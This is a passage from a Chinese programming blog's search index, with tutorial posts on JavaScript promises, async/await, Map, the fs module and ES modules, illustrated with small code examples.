FormData(); formData.append( \u0026#39;media\u0026#39;, buffer, {filename: \u0026#39;bandwidth.png\u0026#39;, contentType: \u0026#39;image/png\u0026#39; } ); robot.wwork.sendImageMessage(owner, formData); }); 上面的程序实际上是从 cacti 服务器拿到一张流量图片，然后 fetch 的结果 anyway，response总是有东西的，都会是成功的，所以我们必须再用 response.ok 来判断，成功就继续得到 buffer 流，最终送到 hubot 中去。三个过程用 then 串了起来，每一步都成功才会进行下一步。\n这样写避免了回调地狱，看起来也比较舒服。\n那什么时候用 promise 呢，它是异步的，有大IO读写硬盘、读写网络的时候用，上面是读写网络。下面再来一个读写磁盘的：\nconst {promise: {readFile, writeFile}} = require(\u0026#39;fs\u0026#39;); (async () =\u0026gt; { let content = await readFile(\u0026#39;./data.txt\u0026#39;, \u0026#39;utf8\u0026#39;); await writeFile(\u0026#39;2.txt\u0026#39;, content, \u0026#39;utf8\u0026#39;); console.log(\u0026#39;ok\u0026#39;); })(); 上面的语法是 ES7 的，它更尽了一步，首先声明一个匿名的函数是 async 异步的，然后用await来进行等待，将读和写两个大操作都放到 await 的一步操作中去，这样程序看起来就变成同步的一步步等待了。跟 ES6 的 promise 比起来，更进了一步。\n","permalink":"https://rendoumi.com/posts/20220524-javascripts_promise/","summary":"\u003cp\u003e\u003cstrong\u003e一、基本概念\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e1. 异步\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e所谓 \u0026quot; 异步 \u0026ldquo;，简单说就是一个任务分成两段， 先执行第一段， 然后转而执行其他任务去， 等做好了准备， 再回过头执行第二段。\u003c/p\u003e\n\u003cp\u003e比如， 有一个任务是读取文件进行处理， 任务的第一段是向操作系统发出请求， 要求读取文件。 然后， 程序执行其他任务， 等到操作系统返回文件，再接着执行任务的第二段（ 处理文件）。 这种不连续的执行， 就叫做异步。\u003c/p\u003e\n\u003cp\u003e相应地， 连续的执行就叫做同步。 由于是连续执行， 不能插入其他任务， 所以操作系统从硬盘读取文件的这段时间， 程序只能干等着什么也做不了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. 回调函数\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003ejavascript 语言对异步编程的实现， 就是回调函数。 所谓回调函数， 就是把任务的第二段单独写在一个函数里面， 等到准备好了，继续执行的时候， 就直接调用这个函数。 它的英语名字 callback， 直译过来就是 \u0026quot; 回调 \u0026ldquo;。\u003c/p\u003e\n\u003cp\u003e读取文件进行处理， 是这样的，readfile 是异步的，readfileSync 是同步的。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efs.readfile(\u0026#39;/etc/passwd\u0026#39;, function(err, data) {\n  if(err) throw err;\n  console.log(data);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面代码中， readfile 函数的第二个参数， 就是回调函数， 也就是任务的第二段。 等到操作系统返回了 / etc / passwd这个文件以后， 回调函数才会执行。\u003c/p\u003e\n\u003cp\u003e==一个有趣的问题是， 为什么 node.js 约定， 回调函数的第一个参数， 必须是错误对象 err（ 如果没有错误， 该参数就是 null）？ 原因是执行分成两段， 在这两段之间抛出的错误， 程序无法捕捉， 只能当作参数， 传入第二段。==\u003c/p\u003e","title":"javascripts中的promise"},{"content":"Javascripts 中的 map\n说到map，如果我们有循环的话，不停遍历，会把时间搞成 O(n)。如果有map，时间就变成了O(1)，所以还是相当有效率的。\nmap 是 ES2015 中新增加的，是一种新的 Object 类型，允许存放各种 key-value 对。\nmap 最大的特性是，key 可以是任何类型，包括 object 和 function；可以调用 size 得到 map 的大小；迭代的时候，是严格按照添加的顺序进行迭代的。\nmap 的方法如下： set, get, size, has, delete, clear:\nlet things = new Map(); const myFunc = () =\u0026gt; \u0026#39;🍕\u0026#39;; things.set(\u0026#39;🚗\u0026#39;, \u0026#39;Car\u0026#39;); things.set(\u0026#39;🏠\u0026#39;, \u0026#39;House\u0026#39;); things.set(\u0026#39;✈️\u0026#39;, \u0026#39;Airplane\u0026#39;); things.set(myFunc, \u0026#39;😄 Key is a function!\u0026#39;); things.size; // 4 things.has(\u0026#39;🚗\u0026#39;); // true things.has(myFunc) // true things.has(() =\u0026gt; \u0026#39;🍕\u0026#39;); // false, not the same reference things.get(myFunc); // \u0026#39;😄 Key is a function!\u0026#39; things.delete(\u0026#39;✈️\u0026#39;); things.has(\u0026#39;✈️\u0026#39;); // false things.clear(); things.size; // 0 // setting key-value pairs is chainable things.set(\u0026#39;🔧\u0026#39;, \u0026#39;Wrench\u0026#39;) .set(\u0026#39;🎸\u0026#39;, \u0026#39;Guitar\u0026#39;) .set(\u0026#39;🕹\u0026#39;, \u0026#39;Joystick\u0026#39;); const myMap = new Map(); // Even another map can be a key things.set(myMap, \u0026#39;Oh gosh!\u0026#39;); things.size; // 4 things.get(myMap); // \u0026#39;Oh gosh!\u0026#39; 迭代它的方法，可以用 for \u0026hellip; of，顺序是严格按照你插入的顺序来的：\nlet activities = new Map(); activities.set(1, \u0026#39;🏂\u0026#39;); activities.set(2, \u0026#39;🏎\u0026#39;); activities.set(3, \u0026#39;🚣\u0026#39;); activities.set(4, \u0026#39;🤾\u0026#39;); for (let [nb, activity] of activities) { console.log(`Activity ${nb} is ${activity}`); } // Activity 1 is 🏂 // Activity 2 is 🏎 // Activity 3 is 🚣 // Activity 4 is 🤾 也可以用 forEach 来迭代，注意一点即可，forEach 的 callback 函数，第一个参数是 value，第二个参数是 key，跟 for \u0026hellip; of 是相反的：\nactivities.forEach((value, key) =\u0026gt; { console.log(`Activity ${key} is ${value}`); }); ","permalink":"https://rendoumi.com/posts/20220523-javascripts_map/","summary":"\u003cp\u003eJavascripts 中的 map\u003c/p\u003e\n\u003cp\u003e说到map，如果我们有循环的话，不停遍历，会把时间搞成 O(n)。如果有map，时间就变成了O(1)，所以还是相当有效率的。\u003c/p\u003e\n\u003cp\u003emap 是 ES2015 中新增加的，是一种新的 Object 类型，允许存放各种 key-value 对。\u003c/p\u003e\n\u003cp\u003emap 最大的特性是，key 可以是任何类型，包括 object 和 function；可以调用 size 得到 map 的大小；迭代的时候，是严格按照添加的顺序进行迭代的。\u003c/p\u003e\n\u003cp\u003emap 的方法如下： set, get, size, has, delete, clear:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ethings\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;🍕\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🚗\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Car\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🏠\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;House\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;✈️\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Airplane\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;😄 Key is a function!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🚗\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;🍕\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// false, not the same reference\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026#39;😄 Key is a function!\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"k\"\u003edelete\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;✈️\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;✈️\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// false\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclear\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// setting key-value pairs is chainable\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🔧\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Wrench\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🎸\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Guitar\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;🕹\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Joystick\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Even another map can be a key\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Oh gosh!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026#39;Oh gosh!\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e迭代它的方法，可以用 for \u0026hellip; of，顺序是严格按照你插入的顺序来的：\u003c/p\u003e","title":"javascripts中的map"},{"content":"千里之行始于足下，javascript 模块漫天飞，能做的事也是五花八门。我们来实践一下\n假设我们有一个文本文件，内容如下：\n里面是一行行数据，我们要做的就是把所有值取整求和，文件中有某些空行\n很简单，程序如下：\nvar fs = require(\u0026#39;fs\u0026#39;); calculate = () =\u0026gt; { fs.readFile(\u0026#39;data.txt\u0026#39;, \u0026#39;utf8\u0026#39;, (err, data) =\u0026gt; { if (err) { throw new Error(err) } const arr = data.split(\u0026#39;\\r\\n\u0026#39;); const result = arr .filter(e =\u0026gt; e) .map(parseFloat) .reduce((curr, next) =\u0026gt; curr + next); console.log(\u0026#39;RESULT: \u0026#39;, result); }); } 超级简单吧\n关键就是上面的链式调用\nsplit 用来分割每一行 filter 用来去掉空行 map 用来把每一行都转化成整数 reduce 用来求和 ","permalink":"https://rendoumi.com/posts/20220522-javascirpts_fs/","summary":"\u003cp\u003e千里之行始于足下，javascript 模块漫天飞，能做的事也是五花八门。我们来实践一下\u003c/p\u003e\n\u003cp\u003e假设我们有一个文本文件，内容如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220524155511802\" loading=\"lazy\" src=\"/posts/20220522-javascirpts_fs/image-20220524155511802.png\"\u003e\u003c/p\u003e\n\u003cp\u003e里面是一行行数据，我们要做的就是把所有值取整求和，文件中有某些空行\u003c/p\u003e\n\u003cp\u003e很简单，程序如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evar \u003cspan class=\"nv\"\u003efs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fs\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecalculate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fs.readFile\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;data.txt\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr, data\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            throw new Error\u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        const \u003cspan class=\"nv\"\u003earr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e data.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        const \u003cspan class=\"nv\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e arr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .filter\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .map\u003cspan class=\"o\"\u003e(\u003c/span\u003eparseFloat\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003ecurr, next\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; curr + next\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        console.log\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;RESULT: \u0026#39;\u003c/span\u003e, result\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e超级简单吧\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220524155746288\" loading=\"lazy\" src=\"/posts/20220522-javascirpts_fs/image-20220524155746288.png\"\u003e\u003c/p\u003e\n\u003cp\u003e关键就是上面的链式调用\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003esplit 用来分割每一行\u003c/li\u003e\n\u003cli\u003efilter 用来去掉空行\u003c/li\u003e\n\u003cli\u003emap 用来把每一行都转化成整数\u003c/li\u003e\n\u003cli\u003ereduce 用来求和\u003c/li\u003e\n\u003c/ul\u003e","title":"javascript的实际应用-fs模块"},{"content":"JavaScript Module 是什么 一个 JavaScript module 模块准确的说就是一个文件，它允许你把代码 export 导出来复用，这样别的 JavaScript 文件可以 import 这个文件把它作为库文件来使用了。\n模块主要是用在工程文件中，用来把代码共享给其他文件用，javascipt 的模块可以说是满天飞。\n这里呢讨论的是前端的部分，即是运行在浏览器中的 javascripts module 部分，而不是运行在后端的 Node.js 的部分，后端现在已经向前端靠拢了。\nES6标准发布后，module成为标准，标准使用是以export指令导出接口，以import引入模块，但是在我们一贯的node模块中，我们依然采用的是CommonJS规范，使用require引入模块，使用module.exports导出接口。这点也理解清楚。\n我们从零来一步步开始吧\n如何把一个 JavaScript 文件转换为 ES 的 module 1: 创建一个 project 目录 这个目录用来放 HTML 和 JavaScript 文件\n2: 建立你的 code 代码文件 在 project 文件夹中建立2个文件:\nindex.html index.js 3: 添加 JavaScript 文件的引用到 HTML 文件中 打开index.html 编辑它：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; \u0026lt;!-- Add the \u0026#34;index.js\u0026#34; JavaScript file to this HTML document --\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 上面的代码中，我们引用了 index.js , 并定义它 type=\u0026ldquo;module\u0026rdquo;，这显式指明了 index.js 是一个 ES 的module。\n那么，如果有了一个 ES 的 